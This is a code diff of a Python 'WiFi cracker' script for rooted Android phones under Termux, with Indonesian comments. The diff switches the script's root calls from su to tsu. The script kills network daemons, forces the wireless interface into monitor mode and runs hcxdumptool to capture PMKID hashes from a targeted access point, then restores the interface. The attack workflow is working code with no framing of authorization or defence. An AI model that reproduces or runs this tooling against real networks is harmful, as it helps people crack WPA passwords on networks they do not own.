@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# main.py - (NATIVE)
-# NO USB ADAPTER • Native Root Monitor Mode • Standard Linux Tools
+# main.py - (NATIVE + TSU)
+# NO USB ADAPTER • Native Root Monitor Mode • TSU Integration
 import subprocess, time, argparse, os, re, signal
 from pathlib import Path
 import threading
@@ -42,27 +42,27 @@ class RedmiWiFiCracker:
     def root_monitor_mode(self):
         """
         Native Monitor Mode using standard 'iw' (nl80211).
-        TIDAK menggunakan modul Magisk / sysfs debug hacks.
+        MENGGUNAKAN TSU untuk Termux Root access.
         """
         print(f"[+] Enabling Native Monitor Mode: {self.iface}")
         
         # 1. Matikan proses yang mengganggu (wpa_supplicant)
-        subprocess.run(f"su -c 'killall wpa_supplicant'", shell=True, stderr=subprocess.DEVNULL)
-        subprocess.run(f"su -c 'killall dhclient'", shell=True, stderr=subprocess.DEVNULL)
+        subprocess.run(f"tsu -c 'killall wpa_supplicant'", shell=True, stderr=subprocess.DEVNULL)
+        subprocess.run(f"tsu -c 'killall dhclient'", shell=True, stderr=subprocess.DEVNULL)
         
         # 2. Matikan interface
-        subprocess.run(f"su -c 'ip link set {self.iface} down'", shell=True)
+        subprocess.run(f"tsu -c 'ip link set {self.iface} down'", shell=True)
         
         # 3. Set mode monitor (Standar Linux: iw dev <iface> set type monitor)
         # Perintah ini bekerja pada kernel yang mendukung nl80211 secara native
-        ret = subprocess.run(f"su -c 'iw dev {self.iface} set type monitor'", shell=True, capture_output=True)
+        ret = subprocess.run(f"tsu -c 'iw dev {self.iface} set type monitor'", shell=True, capture_output=True)
         
         # 4. Nyalakan interface
-        subprocess.run(f"su -c 'ip link set {self.iface} up'", shell=True)
+        subprocess.run(f"tsu -c 'ip link set {self.iface} up'", shell=True)
         
         # 5. Verifikasi
         time.sleep(1)
-        result = subprocess.run(f"iw dev {self.iface} info", shell=True, capture_output=True, text=True)
+        result = subprocess.run(f"tsu -c 'iw dev {self.iface} info'", shell=True, capture_output=True, text=True)
         
         if "type monitor" in result.stdout:
             print("✅ MONITOR MODE ACTIVE (Native)!")
@@ -140,9 +140,9 @@ class RedmiWiFiCracker:
         pcap = f"capture_{bssid.replace(':','_')}.pcapng"
         print(f"\n🔥 PMKID: {bssid} CH{channel} ({duration}s)")
         
-        # Menggunakan hcxdumptool secara langsung via root
+        # Menggunakan hcxdumptool secara langsung via root (TSU)
         # Pastikan hcxdumptool terinstall di termux
-        cmd = f"su -c 'hcxdumptool -i {self.iface} --pmkid --enable_status=1 --channel={channel} --bssid={bssid} -o {pcap}'"
+        cmd = f"tsu -c 'hcxdumptool -i {self.iface} --pmkid --enable_status=1 --channel={channel} --bssid={bssid} -o {pcap}'"
         
         proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
@@ -151,7 +151,7 @@ class RedmiWiFiCracker:
         except KeyboardInterrupt:
             pass
         finally:
-            subprocess.run("su -c 'pkill -f hcxdumptool'", shell=True)
+            subprocess.run("tsu -c 'pkill -f hcxdumptool'", shell=True)
             
         return pcap
     
@@ -200,19 +200,19 @@ class RedmiWiFiCracker:
         return None
     
     def cleanup(self):
-        """Restore normal mode using 'iw'"""
+        """Restore normal mode using 'iw' and TSU"""
         print("\n🧹 Cleanup...")
         # Kembalikan ke mode managed
-        subprocess.run(f"su -c 'ip link set {self.iface} down'", shell=True)
-        subprocess.run(f"su -c 'iw dev {self.iface} set type managed'", shell=True)
-        subprocess.run(f"su -c 'ip link set {self.iface} up'", shell=True)
+        subprocess.run(f"tsu -c 'ip link set {self.iface} down'", shell=True)
+        subprocess.run(f"tsu -c 'iw dev {self.iface} set type managed'", shell=True)
+        subprocess.run(f"tsu -c 'ip link set {self.iface} up'", shell=True)
         
         # Restart service wifi (opsional, tergantung rom)
-        # subprocess.run(f"su -c 'svc wifi enable'", shell=True)
+        # subprocess.run(f"tsu -c 'svc wifi enable'", shell=True)
         print("✅ Network restored (Managed Mode)")
 
 def main():
-    parser = argparse.ArgumentParser(description="🔥 Native WiFi Cracker")
+    parser = argparse.ArgumentParser(description="🔥 Native WiFi Cracker (TSU)")
     parser.add_argument("--iface", default="wlan0", help="WiFi interface")
     parser.add_argument("--duration", type=int, default=120, help="PMKID time")
     args = parser.parse_args()
@@ -225,8 +225,7 @@ def main():
     try:
         if not cracker.root_monitor_mode():
             print("❌ Gagal masuk Monitor Mode.")
-            print("💡 Pastikan: 1. Sudah Root. 2. Tools 'iw' & 'ip' terinstall.")
-            print("   Jika tetap gagal, Kernel Stock mungkin memblokir Monitor Mode tanpa patch modul.")
+            print("💡 Pastikan: 1. Sudah Root. 2. Paket 'tsu' terinstall (pkg install tsu). 3. Tools 'iw' & 'ip' terinstall.")
             exit(1)
         
         cracker.quick_scan()
@@ -254,5 +253,4 @@ def main():
         cracker.cleanup()
 
 if __name__ == "__main__":
-    print("🚀 CRACKER (No Magisk Module)")
     main()
